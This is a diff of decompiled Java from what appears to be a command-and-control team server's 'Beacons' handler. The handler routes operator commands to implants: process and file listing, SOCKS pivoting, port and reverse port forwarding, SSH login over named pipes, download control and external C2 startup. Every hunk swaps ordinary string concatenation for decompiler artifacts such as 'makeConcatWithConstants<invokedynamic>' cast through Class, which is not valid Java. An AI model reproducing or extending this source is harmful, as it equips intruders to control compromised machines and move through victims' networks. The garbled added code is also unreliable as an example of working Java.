@@ -149,12 +149,15 @@ public class Beacons implements ServerHook, CheckinListener, Do {
          for(Iterator var3 = this.ĝ.values().iterator(); var3.hasNext(); var2.put(var4.getId(), var4.copy())) {
             var4 = (BeaconEntry)var3.next();
             var4.touch();
+            Map var10001;
             if (this.notes.containsKey(var4.getId())) {
-               var4.setNote(this.notes.get(var4.getId()) + "");
+               var10001 = this.notes;
+               var4.setNote(((Class)var10001.get(var4.getId())).makeConcatWithConstants<invokedynamic>(var10001.get(var4.getId())));
             }
 
             if (this.accents.containsKey(var4.getId())) {
-               var4.setAccent(this.accents.get(var4.getId()) + "");
+               var10001 = this.accents;
+               var4.setAccent(((Class)var10001.get(var4.getId())).makeConcatWithConstants<invokedynamic>(var10001.get(var4.getId())));
             }
          }
 
@@ -234,7 +237,7 @@ public class Beacons implements ServerHook, CheckinListener, Do {
    public void call(Request var1, ManageUser var2) {
       String var3;
       if (var1.is("beacons.remove", 1)) {
-         var3 = var1.arg(0) + "";
+         var3 = ((Class)var1.arg(0)).makeConcatWithConstants<invokedynamic>(var1.arg(0));
          synchronized(this) {
             BeaconEntry var5 = (BeaconEntry)this.ĝ.get(var3);
             if (var5 != null && var5.isLinked()) {
@@ -262,81 +265,81 @@ public class Beacons implements ServerHook, CheckinListener, Do {
             this.resources.broadcast("beaconlog", var1.arg(0));
          }
       } else if (var1.is("beacons.clear", 1)) {
-         var3 = var1.arg(0) + "";
+         var3 = ((Class)var1.arg(0)).makeConcatWithConstants<invokedynamic>(var1.arg(0));
          this.data.clear(var3);
       } else {
          byte[] var22;
          if (var1.is("beacons.task", 2)) {
-            var3 = var1.arg(0) + "";
-            var22 = (byte[])((byte[])var1.arg(1));
+            var3 = ((Class)var1.arg(0)).makeConcatWithConstants<invokedynamic>(var1.arg(0));
+            var22 = (byte[])var1.arg(1);
             this.data.task(var3, var22);
          } else if (var1.is("beacons.task_pivot", 2)) {
-            var3 = var1.arg(0) + "";
-            var22 = (byte[])((byte[])var1.arg(1));
+            var3 = ((Class)var1.arg(0)).makeConcatWithConstants<invokedynamic>(var1.arg(0));
+            var22 = (byte[])var1.arg(1);
             this.socks.task(var3, var22);
          } else {
             int var23;
             if (var1.is("beacons.pivot", 2)) {
-               var3 = var1.arg(0) + "";
+               var3 = ((Class)var1.arg(0)).makeConcatWithConstants<invokedynamic>(var1.arg(0));
                var23 = (Integer)var1.arg(1);
                this.socks.pivot(var3, var23);
                this.data.seen(var3);
             } else {
                String var24;
+               int var6;
                if (var1.is("beacons.portfwd", 3)) {
-                  var3 = var1.arg(0) + "";
-                  var24 = var1.arg(1) + "";
-                  int var25 = (Integer)var1.arg(2);
-                  this.socks.portfwd(var3, var25, var24, var25);
+                  var3 = ((Class)var1.arg(0)).makeConcatWithConstants<invokedynamic>(var1.arg(0));
+                  var24 = ((Class)var1.arg(1)).makeConcatWithConstants<invokedynamic>(var1.arg(1));
+                  var6 = (Integer)var1.arg(2);
+                  this.socks.portfwd(var3, var6, var24, var6);
                   this.data.seen(var3);
                } else {
-                  int var6;
                   String var26;
                   if (var1.is("beacons.rportfwd_local", 4)) {
-                     var3 = var1.arg(0) + "";
+                     var3 = ((Class)var1.arg(0)).makeConcatWithConstants<invokedynamic>(var1.arg(0));
                      var23 = (Integer)var1.arg(1);
-                     var26 = var1.arg(2) + "";
+                     var26 = ((Class)var1.arg(2)).makeConcatWithConstants<invokedynamic>(var1.arg(2));
                      var6 = (Integer)var1.arg(3);
                      this.socks.rportfwd_local(var2, var3, var23, var26, var6);
                      this.data.seen(var3);
                   } else if (var1.is("beacons.rportfwd", 4)) {
-                     var3 = var1.arg(0) + "";
+                     var3 = ((Class)var1.arg(0)).makeConcatWithConstants<invokedynamic>(var1.arg(0));
                      var23 = (Integer)var1.arg(1);
-                     var26 = var1.arg(2) + "";
+                     var26 = ((Class)var1.arg(2)).makeConcatWithConstants<invokedynamic>(var1.arg(2));
                      var6 = (Integer)var1.arg(3);
                      this.socks.rportfwd(var3, var23, var26, var6);
                      this.data.seen(var3);
                   } else if (var1.is("beacons.pivot_stop_port", 1)) {
-                     int var27 = Integer.parseInt(var1.arg(0) + "");
+                     int var27 = Integer.parseInt(((Class)var1.arg(0)).makeConcatWithConstants<invokedynamic>(var1.arg(0)));
                      this.socks.stop_port(var27);
                   } else if (var1.is("beacons.pivot_stop_port", 2)) {
-                     var3 = var1.arg(0) + "";
-                     var23 = Integer.parseInt(var1.arg(1) + "");
+                     var3 = ((Class)var1.arg(0)).makeConcatWithConstants<invokedynamic>(var1.arg(0));
+                     var23 = Integer.parseInt(((Class)var1.arg(1)).makeConcatWithConstants<invokedynamic>(var1.arg(1)));
                      this.socks.stop_port(var3, var23);
                   } else if (var1.is("beacons.pivot_stop", 1)) {
-                     var3 = var1.arg(0) + "";
+                     var3 = ((Class)var1.arg(0)).makeConcatWithConstants<invokedynamic>(var1.arg(0));
                      this.socks.stop_socks(var3);
                   } else if (var1.is("beacons.mode", 2)) {
-                     var3 = var1.arg(0) + "";
-                     var24 = var1.arg(1) + "";
+                     var3 = ((Class)var1.arg(0)).makeConcatWithConstants<invokedynamic>(var1.arg(0));
+                     var24 = ((Class)var1.arg(1)).makeConcatWithConstants<invokedynamic>(var1.arg(1));
                      this.data.mode(var3, var24);
                   } else {
                      List var29;
                      if (var1.is("beacons.report_posh", 2)) {
-                        var3 = var1.arg(0) + "";
+                        var3 = ((Class)var1.arg(0)).makeConcatWithConstants<invokedynamic>(var1.arg(0));
                         var29 = (List)var1.arg(1);
                         synchronized(this) {
                            this.cmdlets.put(var3, var29);
                            this.resources.broadcast("cmdlets", new HashMap(this.cmdlets), true);
                         }
                      } else if (var1.is("beacons.unlink", 2)) {
-                        var3 = var1.arg(0) + "";
-                        var24 = var1.arg(1) + "";
+                        var3 = ((Class)var1.arg(0)).makeConcatWithConstants<invokedynamic>(var1.arg(0));
+                        var24 = ((Class)var1.arg(1)).makeConcatWithConstants<invokedynamic>(var1.arg(1));
                         this.setup.getController().unlink(var3, var24);
                      } else if (var1.is("beacons.unlink", 3)) {
-                        var3 = var1.arg(0) + "";
-                        var24 = var1.arg(1) + "";
-                        var26 = var1.arg(2) + "";
+                        var3 = ((Class)var1.arg(0)).makeConcatWithConstants<invokedynamic>(var1.arg(0));
+                        var24 = ((Class)var1.arg(1)).makeConcatWithConstants<invokedynamic>(var1.arg(1));
+                        var26 = ((Class)var1.arg(2)).makeConcatWithConstants<invokedynamic>(var1.arg(2));
                         this.setup.getController().unlink(var3, var24, var26);
                      } else {
                         Map var34;
@@ -366,9 +369,10 @@ public class Beacons implements ServerHook, CheckinListener, Do {
                            this.note(var3, var24);
                         } else {
                            String var8;
+                           CommandBuilder var39;
                            if (!var1.is("beacons.task_ssh_login", 6) && !var1.is("beacons.task_ssh_login_pubkey", 6)) {
                               if (var1.is("beacons.task_ipconfig", 1)) {
-                                 var3 = var1.arg(0) + "";
+                                 var3 = ((Class)var1.arg(0)).makeConcatWithConstants<invokedynamic>(var1.arg(0));
                                  BeaconEntry var38 = this.resolve(var3);
                                  if (var38 == null) {
                                     CommonUtils.print_error("No beacon entry for '" + var3 + "'. Dropping task_ipconfig call");
@@ -379,45 +383,45 @@ public class Beacons implements ServerHook, CheckinListener, Do {
                                  byte[] var30 = (new TaskBeaconCallback()).IPConfig(this.callback(var1, var2), var26);
                                  this.data.task(var3, var30);
                               } else if (var1.is("beacons.task_ps", 1)) {
-                                 var3 = var1.arg(0) + "";
+                                 var3 = ((Class)var1.arg(0)).makeConcatWithConstants<invokedynamic>(var1.arg(0));
                                  var22 = (new TaskBeaconCallback()).Ps(this.callback(var1, var2));
                                  this.data.task(var3, var22);
                               } else if (var1.is("beacons.task_drives", 1)) {
-                                 var3 = var1.arg(0) + "";
+                                 var3 = ((Class)var1.arg(0)).makeConcatWithConstants<invokedynamic>(var1.arg(0));
                                  var22 = (new TaskBeaconCallback()).Drives(this.callback(var1, var2));
                                  this.data.task(var3, var22);
                               } else if (var1.is("beacons.task_drives_default", 1)) {
-                                 var3 = var1.arg(0) + "";
+                                 var3 = ((Class)var1.arg(0)).makeConcatWithConstants<invokedynamic>(var1.arg(0));
                                  var22 = (new TaskBeaconCallback()).Drives(-1);
                                  this.data.task(var3, var22);
                               } else {
                                  byte[] var33;
                                  if (var1.is("beacons.task_ls", 2)) {
-                                    var3 = var1.arg(0) + "";
-                                    var24 = var1.arg(1) + "";
+                                    var3 = ((Class)var1.arg(0)).makeConcatWithConstants<invokedynamic>(var1.arg(0));
+                                    var24 = ((Class)var1.arg(1)).makeConcatWithConstants<invokedynamic>(var1.arg(1));
                                     var33 = (new TaskBeaconCallback()).Ls(this.callback(var1, var2), var24);
                                     this.data.task(var3, var33);
                                  } else if (var1.is("beacons.task_ls_default", 2)) {
-                                    var3 = var1.arg(0) + "";
-                                    var24 = var1.arg(1) + "";
+                                    var3 = ((Class)var1.arg(0)).makeConcatWithConstants<invokedynamic>(var1.arg(0));
+                                    var24 = ((Class)var1.arg(1)).makeConcatWithConstants<invokedynamic>(var1.arg(1));
                                     var33 = (new TaskBeaconCallback()).Ls(-2, var24);
                                     this.data.task(var3, var33);
                                  } else if (var1.is("beacons.downloads", 1)) {
-                                    var3 = var1.arg(0) + "";
+                                    var3 = ((Class)var1.arg(0)).makeConcatWithConstants<invokedynamic>(var1.arg(0));
                                     var29 = this.setup.getController().getDownloads(var3);
                                     var2.writeNow(var1.reply(var29));
                                  } else {
                                     Iterator var31;
                                     if (var1.is("beacons.download_cancel", 2)) {
-                                       var3 = var1.arg(0) + "";
-                                       var24 = var1.arg(1) + "";
+                                       var3 = ((Class)var1.arg(0)).makeConcatWithConstants<invokedynamic>(var1.arg(0));
+                                       var24 = ((Class)var1.arg(1)).makeConcatWithConstants<invokedynamic>(var1.arg(1));
                                        List var36 = this.setup.getController().getDownloads(var3);
                                        var31 = var36.iterator();
 
                                        Map var32;
                                        while(var31.hasNext()) {
                                           var32 = (Map)var31.next();
-                                          var8 = var32.get("name") + "";
+                                          var8 = ((Class)var32.get("name")).makeConcatWithConstants<invokedynamic>(var32.get("name"));
                                           if (!CommonUtils.iswm(var24, var8)) {
                                              var31.remove();
                                           }
@@ -427,10 +431,10 @@ public class Beacons implements ServerHook, CheckinListener, Do {
 
                                        while(var31.hasNext()) {
                                           var32 = (Map)var31.next();
-                                          var8 = var32.get("name") + "";
-                                          String var37 = var32.get("fid") + "";
+                                          var8 = ((Class)var32.get("name")).makeConcatWithConstants<invokedynamic>(var32.get("name"));
+                                          String var37 = ((Class)var32.get("fid")).makeConcatWithConstants<invokedynamic>(var32.get("fid"));
                                           this.setup.getController().getDownloadManager().close(var3, Integer.parseInt(var37));
-                                          CommandBuilder var39 = new CommandBuilder();
+                                          var39 = new CommandBuilder();
                                           var39.setCommand(19);
                                           var39.addInteger(Integer.parseInt(var37));
                                           this.data.task(var3, var39.build());
@@ -438,20 +442,20 @@ public class Beacons implements ServerHook, CheckinListener, Do {
                                        }
                                     } else if (var1.is("beacons.whitelist_port", 2)) {
                                        var3 = (String)var1.arg(0);
-                                       var24 = var1.arg(1) + "";
+                                       var24 = ((Class)var1.arg(1)).makeConcatWithConstants<invokedynamic>(var1.arg(1));
                                        this.setup.getController().whitelistPort(var3, var24);
                                     } else if (var1.is("exoticc2.start", 2)) {
                                        var3 = (String)var1.arg(0);
-                                       var23 = Integer.parseInt(var1.arg(1) + "");
+                                       var23 = Integer.parseInt(((Class)var1.arg(1)).makeConcatWithConstants<invokedynamic>(var1.arg(1)));
                                        this.setup.initCrypto();
 
                                        try {
                                           (new ExternalC2Server(this.setup, (ScListener)null, var3, var23)).start();
-                                       } catch (IOException var16) {
-                                          MudgeSanity.logException("Could not start external C2 on " + var3 + ":" + var23, var16, false);
+                                       } catch (IOException var21) {
+                                          MudgeSanity.logException("Could not start external C2 on " + var3 + ":" + var23, var21, false);
                                        }
                                     } else if (var1.is("beacons.update", 2)) {
-                                       var3 = var1.arg(0) + "";
+                                       var3 = ((Class)var1.arg(0)).makeConcatWithConstants<invokedynamic>(var1.arg(0));
                                        Map var40 = (Map)var1.arg(1);
                                        synchronized(this) {
                                           var31 = var40.entrySet().iterator();
@@ -473,32 +477,32 @@ public class Beacons implements ServerHook, CheckinListener, Do {
                                  }
                               }
                            } else {
-                              var3 = var1.arg(0) + "";
-                              var24 = var1.arg(1) + "";
-                              var26 = var1.arg(2) + "";
-                              String var28 = var1.arg(3) + "";
+                              var3 = ((Class)var1.arg(0)).makeConcatWithConstants<invokedynamic>(var1.arg(0));
+                              var24 = ((Class)var1.arg(1)).makeConcatWithConstants<invokedynamic>(var1.arg(1));
+                              var26 = ((Class)var1.arg(2)).makeConcatWithConstants<invokedynamic>(var1.arg(2));
+                              String var28 = ((Class)var1.arg(3)).makeConcatWithConstants<invokedynamic>(var1.arg(3));
                               int var7 = (Integer)var1.arg(4);
-                              var8 = var1.arg(5) + "";
+                              var8 = ((Class)var1.arg(5)).makeConcatWithConstants<invokedynamic>(var1.arg(5));
                               boolean var9 = var1.is("beacons.task_ssh_login_pubkey");
                               String var10 = "\\\\%s\\pipe\\" + ServerUtils.getProfile(this.resources).getSSHPipeName();
                               SSHAgent var11 = new SSHAgent(this.setup, ServerUtils.getProfile(this.resources), var28, var7, var24, var26, var10, var9);
-                              CommandBuilder var12 = new CommandBuilder();
+                              var39 = new CommandBuilder();
                               if ("x86".equals(var8)) {
-                                 var12.setCommand(1);
+                                 var39.setCommand(1);
                               } else {
-                                 var12.setCommand(44);
+                                 var39.setCommand(44);
                               }
 
-                              var12.addString(var11.export(var8));
-                              this.data.task(var3, var12.build());
-                              var12 = new CommandBuilder();
-                              var12.setCommand(40);
-                              var12.addInteger(0);
-                              var12.addShort(27);
-                              var12.addShort(30000);
-                              var12.addLengthAndString(var11.getStatusPipeName());
-                              var12.addLengthAndString("SSH status");
-                              this.data.task(var3, var12.build());
+                              var39.addString(var11.export(var8));
+                              this.data.task(var3, var39.build());
+                              var39 = new CommandBuilder();
+                              var39.setCommand(40);
+                              var39.addInteger(0);
+                              var39.addShort(27);
+                              var39.addShort(30000);
+                              var39.addLengthAndString(var11.getStatusPipeName());
+                              var39.addLengthAndString("SSH status");
+                              this.data.task(var3, var39.build());
                            }
                         }
                      }
